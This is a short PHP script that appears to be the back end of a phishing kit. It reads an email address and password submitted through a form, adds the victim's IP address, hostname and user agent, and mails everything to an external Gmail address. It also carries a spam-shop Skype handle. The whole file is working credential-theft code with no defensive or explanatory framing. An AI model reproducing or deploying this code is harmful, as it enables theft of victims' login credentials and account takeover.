<?php 

    $email=$_POST['postemail'];
    $password = $_POST['postpaswrd'];

    $data=  explode('@',$email);
    $Host = 'http://'.$data[1];
    $data2 = explode('.',$Host);
    $HostSub = $data[1];

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message .= "|----------| D A T A  |--------------|\n";
    $message .= "Online ID            : ".$email."\n";
    $message .= "Passcode              : ".$password."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|-------skype : live:fudspamshop----------|\n";
    

    $to = "nauman.massonry@gmail.com";
    
    $subject .= "$HostSub | $ip";
    
    mail($to,$subject,$message);

   // header("refresh:1;url=http://".$data[1]);


?>